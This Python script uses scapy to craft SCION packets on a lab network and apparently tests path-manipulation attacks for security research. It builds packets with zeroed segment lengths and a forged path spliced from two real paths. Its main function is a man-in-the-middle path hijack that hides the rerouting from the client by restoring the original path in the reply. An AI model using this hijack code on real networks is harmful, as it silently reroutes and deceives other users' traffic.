import socket
import sys
sys.path.append("./scapy-scion-int")
from typing import List, Optional, Tuple, Union
import signal
import json
import subprocess
from scapy_scion.layers.scmp import SCMP, EchoRequest
from scapy_scion.layers.scion import SCION, UDP, SCIONPath
from scapy.all import bind_layers, sniff, sr1, conf, L3RawSocket, IP, Ether, sr, srp, srp1,  SimpleSocket
import pathlib
import pprint
# import scapy
# from scapy import bind_layers, UDP

br_port = 30042
br_addr = "192.168.111.1"
br_iface = "eth1"  # interface to borderrouter


def capture_path(scion: str, src_br: str, sciond: str, dest: str, timeout: Optional[int] = 1,
                 extra_args: List[str] = [], capture_output: bool = False, interface: str = 'lo') -> Union[SCION, Tuple[SCION, str]]:
    """Ping an AS and capture to echo request to extract the path from it.
    :param scion: "scion" command to use for the ping.
    :param src_br: Internal interface of a border router in the source AS.
                   Example: "127.0.0.33:31010"
    :param sciond: Address of sciond in the source AS.
                   Example: "127.0.0.35:30255"
    :param dest: Destination host in the format expected by "scion ping".
                 Example: "3-ff00:0:7,127.0.0.1"
    :param timeout: How long to wait before giving up if no packet is captured, e.g., because the
                    ping failed. The value is in seconds. None disables the timeout.
    :param extra_args: Additional command line arguments passed to 'scion ping'.
    :param capture_output: Capture the output of the 'scion ping' command and return it. If False,
                           the command's output will be written to stdout and stderr as usual.
    :returns: Captured SCION header with payload removed. If capture_output was True, a pair of the
              captures SCION header and the output of the ping command.
    """
    # Capture an echo request
    ping = None

    def ping_cb():
        nonlocal ping
        args = {}
        if capture_output:
            args = {'stdout': subprocess.PIPE,
                    'stderr': subprocess.STDOUT, 'encoding': "utf-8"}
        ping = subprocess.Popen(
            [scion, "ping", "--sciond", sciond, dest] + extra_args, **args)

    br = src_br.split(":")
    cap = sniff(iface=interface, count=1, timeout=timeout,
                filter=f"dst {br[0]} and port {br[1]}",
                lfilter=lambda pkt: pkt.haslayer(
                    SCMP) and pkt[SCMP].Type == 128,
                started_callback=ping_cb)

    ping.send_signal(signal.SIGINT)

    # Extract SCION header
    p = cap[0][SCION]
    p.remove_payload()
    del p.NextHdr
    del p.HdrLen
    del p.PayloadLen

    if capture_output:
        return (p, ping.stdout.read() if ping.stdout else None)
    else:
        return p


def get_all_paths(scion_cmd: str, dst_IA: str, extra_args: List[str] = [], capture_output: bool = True, max_paths: int = 1000) -> dict:
    """
    Retrieve all paths from a source AS to a destination IA using the SCION network.

    Args:
        scion_cmd (str): The path to the SCION command-line tool.
        dst_IA (str): The destination IA (ISD-AS) to which paths are to be found.
        extra_args (List[str], optional): Additional arguments to be passed to the SCION command. Defaults to [].
        capture_output (bool, optional): Flag indicating whether to capture the command output. Defaults to True.
        max_paths (int, optional): The maximum number of paths to retrieve. Defaults to 1000.

    Returns:
        dict: A dictionary containing the retrieved paths in JSON format.
    """
    
    args = {}
    if capture_output:
        args = {'stdout': subprocess.PIPE,
                'stderr': subprocess.STDOUT, 'encoding': "utf-8"}
    paths_process = subprocess.Popen(
        [scion_cmd, "showpaths", dst_IA, "--maxpaths", f"{max_paths}", "--format", "json"] + extra_args, **args)
    output, _ = paths_process.communicate()
    paths = json.loads(output)
    return paths


def test():
    """TEST as in the README of the original scapy-scion-int repository."""
    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    pkts = sniff(iface=br_iface,
                 filter=f"host {br_addr} and port {br_port}",
                 lfilter=lambda pkt: pkt.haslayer(
                     SCMP) and pkt[SCMP].Type == 128,
                 count=1)

    p = pkts[0]
    print(p)
    p = pkts[0][IP]
    p[SCION].remove_payload()
    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    del p[SCION].NextHdr
    del p[SCION].HdrLen
    del p[SCION].PayloadLen
    

    print("--------------------")

    req = p/SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"Hello!"))
    req[SCION].DstHostAddr = "192.168.110.1"
    req.show()
    req.show2()
    print("--------------------")
    # conf.L3socket = L3RawSocket
    resp = sr1(req, iface=br_iface, timeout=1)
    resp.show()


def fetch_paths(dst_IA: str) -> dict:
    """
    Fetches paths to a destination IA and saves them to a file.

    Args:
        dst_IA (str): The destination IA to fetch paths for.

    Returns:
        dict: A dictionary containing the fetched paths.
    """
    paths = get_all_paths("scion", dst_IA, extra_args=["--refresh"])
    pathlib.Path("output").mkdir(parents=True, exist_ok=True)
    with open("output/paths.json", "w") as f:
        json.dump(paths, f, indent=4)
    # change permissions to allow reading by other users
    subprocess.run(["chmod", "o+r", "output/paths.json"])
    return paths


def choose_path(dst_IA: str, paths: dict, index: Optional[int] = None, sequence: Optional[str] = None) -> Union[SCION, Tuple[SCION, str]]:
    """
    Choose a path for sending a SCION packet.

    Args:
        dst_IA (str): The destination IA (ISD-AS) of the packet.
        paths (dict): A dictionary containing the available paths.
        index (Optional[int]): The index of the path to choose. If provided, the sequence will be ignored.
        sequence (Optional[str]): The sequence to use for the chosen path. If not provided, the first path's sequence will be used.

    Returns:
        Union[SCION, Tuple[SCION, str]]: The chosen path as a SCION object or a tuple containing the SCION object and the sequence used.

    """
    dstISD, dstAS = dst_IA.split("-")
    if index:
        # Ignore sequence if index is provided
        chosen_path = paths["paths"][index]
        sequence = chosen_path["sequence"]
    if not sequence:
        # No index and no sequence provided
        chosen_path = paths["paths"][0]
        sequence = chosen_path["sequence"]
    print("Chosen path = ", sequence)

    dstAddr = "127.0.0.1" # anything, not important as we just capture the created SCION packet with the path
    path, _ = capture_path(scion="scion", src_br=f"{br_addr}:{br_port}",
                        sciond="127.0.0.1:30255", dest=f"{dstISD}-{dstAS},{dstAddr}",  extra_args=["--sequence", f"{sequence}"], interface=br_iface, capture_output=True)
    return path



def base():
    """
    Perform the base case behavior:
    - Fetch paths for the destination IA
    - Send a simple packet and get the response
    """

    dstISD = 64
    dstAS = "2:0:2c"
    dst_IA = f"{dstISD}-{dstAS}"

    paths = fetch_paths(dst_IA)

    sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"

    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)

    dstAddr = "192.168.110.1"
    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    myIP = IP()
    myIP.src = "192.168.111.25"
    myIP.dst = br_addr # address of border router (NOT! actual destination address)
    # myIP.flags = "DF" # Don't fragment (less important?)

    myUDP = UDP()
    myUDP.sport = 30041
    myUDP.dport = br_port

    mySCION = SCION_path1
    mySCION.SrcISD = 64
    mySCION.SrcAS = "2:0:2b"
    mySCION.PathType = 1
    mySCION.DstHostAddr = dstAddr
    mySCION.SrcHostAddr = "192.168.111.25"

    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))

    p = myIP/myUDP/mySCION/mySCMP

    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    del p[SCION].NextHdr
    del p[SCION].HdrLen
    del p[SCION].PayloadLen
    p.show2()
    # p.pdfdump("output/sent_packet.pdf")
    
    resp = sr1(p, iface=br_iface, timeout=1)
    resp.show()
    # resp.pdfdump("output/received_packet.pdf")


def emptyInfo():
    """
    Mess around with info fields and segment lengths in a SCION packet.
    """

    dstISD = 64
    dstAS = "2:0:2c"
    dst_IA = f"{dstISD}-{dstAS}"

    paths = fetch_paths(dst_IA)

    sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"

    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)

    dstAddr = "192.168.110.1"
    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    myIP = IP()
    myIP.src = "192.168.111.25"
    myIP.dst = br_addr # address of border router (NOT! actual destination address)
    # myIP.flags = "DF" # Don't fragment (less important?)

    myUDP = UDP()
    myUDP.sport = 30041
    myUDP.dport = br_port

    mySCION = SCION_path1
    mySCION.DstISD = dstISD
    mySCION.DstAS = dstAS
    mySCION.SrcISD = 64
    mySCION.SrcAS = "2:0:2b"
    mySCION.PathType = 1
    mySCION.DstHostAddr = dstAddr
    mySCION.SrcHostAddr = "192.168.111.25"
    # mySCION.Path.CurrHF = 0
    mySCION.Path.Seg0Len =  0
    mySCION.Path.Seg1Len =  0
    mySCION.Path.Seg2Len =  0

    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))

    p = myIP/myUDP/mySCION/mySCMP

    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    del p[SCION].NextHdr
    del p[SCION].HdrLen
    del p[SCION].PayloadLen
    p.show2()
    # p.pdfdump("output/sent_packet.pdf")
    
    resp = sr1(p, iface=br_iface, timeout=1)
    resp.show()
    # resp.pdfdump("output/received_packet.pdf")


def wrongNewPath():
    """
    Creates a new path that does not exist out of two valid paths.

    This function fetches paths to a destination Internet Address (IA) and then creates a new path
    by combining parts of two existing paths. The resulting path is not a valid path to the destination IA.

    Args:
        None

    Returns:
        None
    """
    
    dstISD = 64
    dstAS = "2:0:2c"
    dst_IA = f"{dstISD}-{dstAS}"

    paths = fetch_paths(dst_IA)

    sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"
    sequence2 = "64-2:0:2b#0,1 64-559#24,25 64-12350#3,5 64-15623#1,5 64-3303#19,21 64-2:0:2c#1,0"

    new_seq = "64-2:0:2b#0,1 64-559#24,25 64-12350#3,5 64-15623#1,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0"

    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)
    SCION_path2 = choose_path(dst_IA, paths, sequence=sequence2)

    dstAddr = "192.168.110.1"
    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    myIP = IP()
    myIP.src = "192.168.111.25"
    myIP.dst = br_addr # address of border router (NOT! actual destination address)
    # myIP.flags = "DF" # Don't fragment (less important?)

    myUDP = UDP()
    myUDP.sport = 30041
    myUDP.dport = br_port

    mySCION = SCION_path1
    mySCION.DstISD = dstISD
    mySCION.DstAS = dstAS
    mySCION.SrcISD = 64
    mySCION.SrcAS = "2:0:2b"
    mySCION.PathType = 1
    mySCION.DstHostAddr = dstAddr
    mySCION.SrcHostAddr = "192.168.111.25"
    
    hops1 = mySCION.Path.HopFields
    hops2 = SCION_path2.Path.HopFields
    myhop = hops2[4]
    myhop.ConsIngress = hops1[3].ConsIngress # 16
    mySCION.Path.HopFields = [hops1[0], hops1[1], hops2[2], hops2[3], myhop, hops1[4]] + hops1[5:]
    mySCION.Path.InfoFields[1] = SCION_path2.Path.InfoFields[1]
    pprint.pprint(mySCION.Path.HopFields)
    pprint.pprint(mySCION.Path.InfoFields)
    mySCION.Path.show()
    input('continue?')

    mySCMP = SCMP(Message=EchoRequest(Identifier=0xabcd, Data=b"A"*13))

    p = myIP/myUDP/mySCION/mySCMP

    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    del p[SCION].NextHdr
    del p[SCION].HdrLen
    del p[SCION].PayloadLen
    p.show2()
    # p.pdfdump("output/sent_packet.pdf")
    
    resp = sr1(p, iface=br_iface, timeout=1)
    resp.show()
    # resp.pdfdump("output/received_packet.pdf")


def interceptAndModify():
    """
    Intercepts and modifies a packet from the client (see client.py).

    This function intercepts a packet, modifies its path, and sends it back.
    The attacker performs the following steps:
    1. Chooses a path based on its preference
    2. Receives a packet from the client.
    3. Modifies the path of the packet to his chosen path.
    4. Sends the modified packet to the destination and gets response back.
    5. Reverts the path back to its original state.
    6. Forwards the response back to the client.

    The client will see the original path in the SCION header and does not suspect a path hijack.

    Args:
        None

    Returns:
        None
    """
    
    dstISD = 64
    dstAS = "2:0:2c"
    dst_IA = f"{dstISD}-{dstAS}"

    paths = fetch_paths(dst_IA)

    # path of client
    # sequence1 = "64-2:0:2b#0,1 64-559#24,21 64-15623#8,16 64-6730#27,8 64-3303#10,21 64-2:0:2c#1,0" 
    sequence1 = "64-2:0:2b#0,1 64-559#24,25 64-12350#3,5 64-15623#1,5 64-3303#19,21 64-2:0:2c#1,0"

    SCION_path1 = choose_path(dst_IA, paths, sequence=sequence1)

    bind_layers(UDP, SCION, dport=br_port)
    bind_layers(UDP, SCION, sport=br_port)
    
    host = socket.gethostname()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind((host, 12345))
    s.listen(1)
    print("Server listening.... (start client.py)")
    c, address = s.accept()
    print(f"Connected to: {address}")
    ss = SimpleSocket(c, IP)
    p = ss.recv()
    print("packet is = ", p)

    # save path to change it back
    old_path = p[SCION].Path
    p[SCION].Path = SCION_path1[SCION].Path
    del p[IP].len
    del p[IP].chksum
    del p[UDP].len
    del p[UDP].chksum
    if SCMP in p:
        del p[SCMP].Checksum
    resp = sr1(p, iface=br_iface, timeout=1)

    # change path back
    infofields = old_path.InfoFields[::-1] # reverse the list
    for info in infofields:
        info.Flags ^= 1 # toggle the C flag
    old_path.InfoFields = infofields
    old_path.HopFields = old_path.HopFields[::-1] # reverse the list
    seg0len = old_path.Seg0Len
    old_path.Seg0Len = old_path.Seg2Len
    old_path.Seg2Len = seg0len
    total_len = old_path.Seg0Len + old_path.Seg1Len + old_path.Seg2Len
    old_path.CurrHF = total_len - old_path.CurrHF - 1
    # if SegXLen is not 0 -> increase nr_segments by 1
    nr_segments = sum(1 for seg in [old_path.Seg0Len, old_path.Seg1Len, old_path.Seg2Len] if seg != 0)
    old_path.CurrINF = nr_segments - old_path.CurrINF - 1

    resp[SCION].Path = old_path
    del resp[IP].len
    del resp[IP].chksum
    del resp[UDP].len
    del resp[UDP].chksum
    if SCMP in resp:
        del resp[SCMP].Checksum

    resp.show2()
    ss.send(resp)
    s.close()




if __name__ == "__main__":
    # base()
    # emptyInfo()
    # wrongNewPath()
    interceptAndModify()